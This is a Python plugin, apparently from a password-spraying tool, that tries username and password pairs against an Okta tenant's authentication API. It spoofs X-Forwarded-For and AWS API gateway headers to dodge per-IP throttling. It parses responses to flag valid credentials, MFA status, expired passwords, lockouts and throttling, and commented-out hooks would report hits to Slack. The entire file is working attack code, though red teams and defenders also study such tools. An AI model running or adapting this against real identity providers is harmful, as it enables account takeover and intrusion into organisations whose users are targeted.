import json, requests
import utils.utils as utils

def okta_authenticate(url, username, password, useragent, pluginargs):

    data_response = {
        'result': None,    # Can be "success", "failure" or "potential"
		'error' : False,
        'output' : "",
        'valid_user' : False
    }

    raw_body = "{\"username\":\"%s\",\"password\":\"%s\",\"options\":{\"warnBeforePasswordExpired\":true,\"multiOptionalFactorEnroll\":true}}" % (username, password)

    spoofed_ip = utils.generate_ip()
    amazon_id = utils.generate_id()
    trace_id = utils.generate_trace_id()

    headers = {
            'User-Agent': useragent,
            "X-My-X-Forwarded-For" : spoofed_ip,
            "x-amzn-apigateway-api-id" : amazon_id,
            "X-My-X-Amzn-Trace-Id" : trace_id,

            'Content-Type': 'application/json'
    }

    headers = utils.add_custom_headers(pluginargs, headers)

    try:
        resp = requests.post(f"{url}/api/v1/authn/",data=raw_body,headers=headers)

        if resp.status_code == 200:
            resp_json = json.loads(resp.text)

            if resp_json.get("status") == "LOCKED_OUT": #Warning: administrators can configure Okta to not indicate that an account is locked out. Fair warning ;)
                data_response['result'] = "failure"
                data_response['output'] = f"[-] FAILURE: Locked out {username}:{password}"
                # data_response['action'] = 'redirect'
                # utils.slacklog("Alert: Accounts are being locked out. Consider stopping spray")

            elif resp_json.get("status") == "SUCCESS":
                data_response['result'] = "success"
                data_response['output'] = f"[+] SUCCESS: => {username}:{password}"
                data_response['valid_user'] = True
                # utils.slacknotify(username, password + "\nInfo: NO MFA Required!")

            elif resp_json.get("status") == "MFA_REQUIRED":
                # data_response['2fa_enabled'] = True
                data_response['result'] = "success"
                data_response['output'] = f"[+] SUCCESS: 2FA => {username}:{password}"
                data_response['valid_user'] = True
                # utils.slacknotify(username, password + "\nInfo: MFA Configured.")

            elif resp_json.get("status") == "PASSWORD_EXPIRED":
                # data_response['change'] = True
                data_response['result'] = "success"
                data_response['output'] = f"[+] SUCCESS: password expired {username}:{password}"
                data_response['valid_user'] = True
                # utils.slacknotify(username, password + "\nInfo: Password Expired.")

            elif resp_json.get("status") == "MFA_ENROLL":
                data_response['result'] = "success"
                data_response['output'] = f"[+] SUCCESS: MFA enrollment required {username}:{password}"
                data_response['valid_user'] = True
                # utils.slacknotify(username, password + "\nInfo: MFA is not configured!")

            else:
                data_response['result'] = "failure"
                data_response['output'] = f"[?] ALERT: 200 but doesn't indicate success {username}:{password}"
                # utils.slacklog("Alert: We got a 200 but it is not clear if creds are valid")
                # utils.slacknotify(username, password + "\nInfo: May be valid, proceed with caution!")

        elif resp.status_code == 403:
                data_response['result'] = "failure"
                # data_response['code'] = resp.status_code
                data_response['output'] = f"[-] FAILURE THROTTLE INDICATED: {resp.status_code} => {username}:{password}"
                # utils.slacklog("Alert: Throttle Detected, proceed with caution")

        else:
            data_response['result'] = "failure"
            # data_response['code'] = resp.status_code
            data_response['output'] = f"[-] FAILURE: {resp.status_code} => {username}:{password}"


    except Exception as ex:
        data_response['error'] = True
        data_response['output'] = ex
        pass

    return data_response
